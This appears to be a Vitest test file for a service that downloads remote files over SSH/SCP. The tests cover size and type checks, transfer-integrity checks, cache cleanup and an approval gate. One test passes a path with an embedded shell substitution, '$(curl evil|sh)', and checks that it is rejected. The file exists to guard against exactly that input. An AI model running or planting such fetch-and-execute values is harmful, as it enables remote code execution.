    const result = await service.download('ssh:biowulf', '/remote/results.csv', dest)

    expect(result.name).toBe('results.csv')
    expect(result.size).toBe(4096)
    expect(result.mimeType).toBe('text/csv')
    expect(result.artifactId).toBeDefined()
  })

  it('throws not_a_file when remote is empty (size=0)', async () => {
    // stat returns size=0 → empty file rejected
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 0',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/empty.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })

  it('throws too_large when remote file >50MB', async () => {
    const bigSize = 50 * 1024 * 1024 + 1
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: `f ${bigSize}`,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/big.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('too_large')
  })

  it('throws outside_roots when path has glob chars', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/*.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
  })

  it('throws not_a_file when remote is a directory', async () => {
    // stat returns type 'd'
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'd 4096',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/mydir', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })

  it('throws not_found when the remote file disappeared before transfer', async () => {
    const runner: SshRunner = {
      run: vi.fn(async (_target, command) => ({
        exitCode: 0,
        stdout: command.includes("echo 'm 0'") ? 'm 0' : '? 0',
        stderr: '',
        truncated: false,
        timedOut: false
      }))
    }
    const { repo } = makeRepo()
    const scpRunner = defaultScpRunner()
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/disappeared.csv', {
        kind: 'artifact',
        projectId: 'proj-1'
      })
      .catch((e) => e)

    expect(err.remoteFsError).toMatchObject({
      remoteKind: 'not_found',
      detail: expect.stringMatching(/not found/i)
    })
    expect(scpRunner.copy).not.toHaveBeenCalled()
  })

  it('throws not_a_file if post-transfer re-stat detects size growth', async () => {
    // Pre-transfer stat: 100 bytes; post-transfer actual file: 200 bytes (growth detected)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        // Write more bytes than reported by pre-transfer stat (simulates growth during transfer)
        await writeFile(localPath, 'x'.repeat(200))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/growing.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })

  it('rejects a truncated artifact whose local size is smaller than the pre-transfer stat', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 10',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'short')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, undefined, scpRunner, tmpDir)

    const error = await service
      .download('ssh:biowulf', '/remote/data.csv', {
        kind: 'artifact',
        projectId: 'proj-1'
      })
      .catch((cause) => cause)

    expect(error.remoteFsError).toMatchObject({
      remoteKind: 'not_a_file',
      detail: expect.stringMatching(/changed during transfer/i)
    })
    expect(await readdir(tmpDir)).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// ComputeRemoteOperationOwner.download (session-cache) — agent approval gate
// ---------------------------------------------------------------------------

describe('ComputeRemoteOperationOwner.download (session-cache)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-session-cache-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('binds request cancellation to connection acquisition and SCP transfer', async () => {
    const download = vi.fn(async (_remotePath: string, localPath: string) => {
      await writeFile(localPath, 'content')
      return {
        exitCode: 0,
        stderr: '',
        timedOut: false,
        bytesWritten: 7,
        exceeded: false
      }
    })
    const acquire = vi.fn(async () => ({
      run: vi.fn(async () => ({
        exitCode: 0,
        stdout: 'f 7',
        stderr: '',
        truncated: false,
        timedOut: false
      })),
      upload: vi.fn(),
      download
    }))
    const { repo } = makeRepo()
    const service = new ComputeRemoteOperationOwner(
      { acquire },
      repo,
      makeApprovalBroker('once'),
      tmpDir,
      new SessionCacheOwner(tmpDir)
    )
    const signal = new AbortController().signal

    await service.download(
      'ssh:biowulf',
      '/remote/results.csv',
      { kind: 'session-cache' },
      { sessionId: 'session-1', projectId: 'project-1' },
      signal
    )

    expect(acquire).toHaveBeenCalledWith('ssh:biowulf', {
      intent: 'direct_download',
      signal
    })
    expect(download).toHaveBeenCalledOnce()
  })

  it('downloads to session cache and returns LocalFile when approved', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 7',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'content')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker = makeApprovalBroker('once')
    const service = makeOwner(runner, repo, broker, scpRunner, tmpDir)

    const result = await service.download(
      'ssh:biowulf',
      '/remote/results.csv',
      { kind: 'session-cache' },
      { sessionId: 'session-1', projectId: 'project-1' }
    )

    expect(result.name).toBe('results.csv')
    expect(result.size).toBe(7) // 'content' is 7 bytes
    expect(result.path).toContain('results.csv')
    expect(result.mimeType).toBe('text/csv')
    const transferPath = vi.mocked(scpRunner.copy).mock.calls[0]?.[1].at(-1) as string
    expect(basename(dirname(transferPath))).toMatch(/^\.partial-/)
    expect(basename(dirname(result.path))).not.toMatch(/^\.partial-/)
    expect(result.path).not.toBe(transferPath)
    await expect(readFile(result.path, 'utf8')).resolves.toBe('content')
    await expect(stat(dirname(transferPath))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('rejects a session-cache download when the remote size changes during transfer', async () => {
    const run = vi
      .fn()
      .mockResolvedValueOnce({
        exitCode: 0,
        stdout: 'f 7',
        stderr: '',
        truncated: false,
        timedOut: false
      })
      .mockResolvedValueOnce({
        exitCode: 0,
        stdout: 'f 6',
        stderr: '',
        truncated: false,
        timedOut: false
      })
    const runner: SshRunner = { run }
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'content')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, makeApprovalBroker('once'), scpRunner, tmpDir)

    const error = await service
      .download(
        'ssh:biowulf',
        '/remote/results.csv',
        { kind: 'session-cache' },
        { sessionId: 'session-1', projectId: 'project-1' }
      )
      .catch((cause) => cause)

    expect(error.remoteFsError).toMatchObject({
      remoteKind: 'not_a_file',
      detail: expect.stringMatching(/changed during transfer/i)
    })
  })

  it('removes the session-cache directory immediately when the transfer fails', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 7',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    let attemptedLocalPath: string | undefined
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        attemptedLocalPath = args[args.length - 1]
        return { exitCode: 1, stderr: 'connection reset', timedOut: false }
      })
    }
    const service = makeOwner(runner, repo, makeApprovalBroker('once'), scpRunner, tmpDir)

    await expect(
      service.download(
        'ssh:biowulf',
        '/remote/results.csv',
        { kind: 'session-cache' },
        { sessionId: 'session-1', projectId: 'project-1' }
      )
    ).rejects.toThrow('connection reset')

    expect(attemptedLocalPath).toBeDefined()
    await expect(stat(dirname(attemptedLocalPath!))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it.each(['Session', 'Project'] as const)(
    'waits for in-flight downloads before removing the %s cache',
    async (scope) => {
      let releaseTransfer!: () => void
      const transferGate = new Promise<void>((resolve) => {
        releaseTransfer = resolve
      })
      let markTransferStarted!: () => void
      const transferStarted = new Promise<void>((resolve) => {
        markTransferStarted = resolve
      })
      const download = vi.fn(async (_remotePath: string, localPath: string) => {
        await writeFile(localPath, 'content')
        markTransferStarted()
        await transferGate
        return {
          exitCode: 0,
          stderr: '',
          timedOut: false,
          bytesWritten: 7,
          exceeded: false
        }
      })
      const run = vi.fn(async () => ({
        exitCode: 0,
        stdout: 'f 7',
        stderr: '',
        truncated: false,
        timedOut: false
      }))
      const cache = new SessionCacheOwner(tmpDir)
      const { repo } = makeRepo()
      const service = new ComputeRemoteOperationOwner(
        {
          acquire: vi.fn(async () => ({ run, upload: vi.fn(), download }))
        },
        repo,
        makeApprovalBroker('once'),
        tmpDir,
        cache
      )
      const downloading = service.download(
        'ssh:biowulf',
        '/remote/results.csv',
        { kind: 'session-cache' },
        { sessionId: 'session-1', projectId: 'project-1' }
      )
      await transferStarted

      const deleting =
        scope === 'Session'
          ? cache.removeSession('project-1', 'session-1')
          : cache.removeProject('project-1')
      const deletionOutcome = await Promise.race([
        deleting.then(() => 'settled' as const),
        new Promise<'blocked'>((resolve) => setTimeout(() => resolve('blocked'), 500))
      ])

      releaseTransfer()
      const [downloadResult, deletionResult] = await Promise.allSettled([downloading, deleting])

      expect(deletionOutcome).toBe('blocked')
      expect(downloadResult.status).toBe('fulfilled')
      expect(deletionResult.status).toBe('fulfilled')
    }
  )

  it('keeps data-root migration blocked until the session-cache download finishes', async () => {
    let releaseTransfer!: () => void
    const transferGate = new Promise<void>((resolve) => {
      releaseTransfer = resolve
    })
    let markTransferStarted!: () => void
    const transferStarted = new Promise<void>((resolve) => {
      markTransferStarted = resolve
    })
    const download = vi.fn(async (_remotePath: string, localPath: string) => {
      await writeFile(localPath, 'content')
      markTransferStarted()
      await transferGate
      return {
        exitCode: 0,
        stderr: '',
        timedOut: false,
        bytesWritten: 7,
        exceeded: false
      }
    })
    const run = vi.fn(async () => ({
      exitCode: 0,
      stdout: 'f 7',
      stderr: '',
      truncated: false,
      timedOut: false
    }))
    const { repo } = makeRepo()
    const service = new ComputeRemoteOperationOwner(
      { acquire: vi.fn(async () => ({ run, upload: vi.fn(), download })) },
      repo,
      makeApprovalBroker('once'),
      tmpDir,
      new SessionCacheOwner(tmpDir)
    )
    const downloading = service.download(
      'ssh:biowulf',
      '/remote/results.csv',
      { kind: 'session-cache' },
      { sessionId: 'session-1', projectId: 'project-1' }
    )
    await transferStarted

    let drained = false
    const drain = waitForDataRootWriters().then(() => {
      drained = true
    })
    await Promise.resolve()

    expect(drained).toBe(false)
    releaseTransfer()
    await downloading
    await drain
    expect(drained).toBe(true)
  })

  it('throws download_denied when broker denies session-cache download', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 4',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const broker = makeApprovalBroker('deny')
    const service = makeOwner(runner, repo, broker, successScpRunner, tmpDir)

    const err = await service
      .download(
        'ssh:biowulf',
        '/remote/secret.key',
        { kind: 'session-cache' },
        { sessionId: 'session-1', projectId: 'project-1' }
      )
      .catch((e) => e)
    expect(err.message).toMatch(/download_denied|denied/i)
  })

  it('does not acquire a remote connection before session-cache approval', async () => {
    const acquire = vi.fn()
    const { repo } = makeRepo()
    const service = new ComputeRemoteOperationOwner(
      { acquire } as unknown as ComputeConnectionBrokerAcquirer,
      repo,
      makeApprovalBroker('deny'),
      tmpDir,
      new SessionCacheOwner(tmpDir)
    )

    await expect(
      service.download(
        'ssh:biowulf',
        '/remote/secret.key',
        { kind: 'session-cache' },
        { sessionId: 'session-1', projectId: 'project-1' }
      )
    ).rejects.toMatchObject({ code: 'download_denied' })

    expect(acquire).not.toHaveBeenCalled()
  })

  it('fires approval BEFORE scp for session-cache', async () => {
    const callOrder: string[] = []

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 4',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        callOrder.push('scp')
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'data')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once')
      }),
      requestWithContext: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once')
      }),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = makeOwner(runner, repo, broker, scpRunner, tmpDir)
    await service.download(
      'ssh:biowulf',
      '/remote/data.csv',
      { kind: 'session-cache' },
      { sessionId: 'session-1', projectId: 'project-1' }
    )

    expect(callOrder).toEqual(['approval', 'scp'])
  })

  it('uses requestWithContext when session/project context is supplied', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 4',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'data')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => Promise.resolve('once')),
      requestWithContext: vi.fn(() => Promise.resolve('session')),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = makeOwner(runner, repo, broker, scpRunner, tmpDir)
    await service.download(
      'ssh:biowulf',
      '/remote/data.csv',
      { kind: 'session-cache' },
      { sessionId: 'sess-1', projectId: 'proj-1' }
    )

    expect(vi.mocked(broker.requestWithContext)).toHaveBeenCalledOnce()
    expect(vi.mocked(broker.request)).not.toHaveBeenCalled()
  })

  it('does NOT trigger approval for os-downloads', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(100))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker = makeApprovalBroker('deny') // if called, denies
    const service = makeOwner(runner, repo, broker, scpRunner, tmpDir)

    // os-downloads should NOT consult the broker - should succeed even with deny broker
    const result = await service.download('ssh:biowulf', '/remote/file.txt', {
      kind: 'os-downloads'
    })
    expect(result.name).toBe('file.txt')
    // Confirm broker was NOT called
    expect(vi.mocked(broker.request)).not.toHaveBeenCalled()
  })

  it('throws when no approval broker is configured for session-cache', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = makeOwner(runner, repo) // no broker

    await expect(
      service.download('ssh:biowulf', '/remote/data.csv', { kind: 'session-cache' })
    ).rejects.toThrow(/broker|required/i)
  })

  it('rejects an injection path (outside_roots) BEFORE approval or scp', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const brokerRequest = vi.fn(() => Promise.resolve('once' as const))
    const scpCopy = vi.fn(() => Promise.resolve({ exitCode: 0, stderr: '', timedOut: false }))
    const broker = {
      request: brokerRequest,
      requestWithContext: brokerRequest,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker
    const service = makeOwner(runner, repo, broker, { copy: scpCopy }, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/$(curl evil|sh).csv', { kind: 'session-cache' })
      .catch((e) => e)

    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
    // Neither the approval card nor scp should have been reached.
    expect(brokerRequest).not.toHaveBeenCalled()
    expect(scpCopy).not.toHaveBeenCalled()
  })
})
